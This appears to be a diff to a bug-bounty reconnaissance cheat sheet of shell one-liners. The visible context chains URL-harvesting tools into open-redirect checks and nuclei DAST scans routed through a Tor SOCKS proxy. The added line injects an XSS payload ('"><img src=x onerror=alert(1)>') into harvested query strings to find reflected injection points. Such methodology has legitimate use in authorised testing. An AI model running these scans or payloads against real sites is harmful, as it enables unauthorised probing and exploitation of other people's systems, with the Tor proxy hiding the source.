@@ -183,3 +183,5 @@ https://obfuscator.io/#output
 16. cat allurls.txt | gf redirect | openredirex
 
 cat allurls.txt | gau | urldedupe -s | gf sqli | nuclei -t /root/nuclei-templates/dast/vulnerabilities --dast -proxy socks5://127.0.0.1:9050 | anew all-nuc.txt
+
+cat allurls.txt | waybackurls | urldedupe -s qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
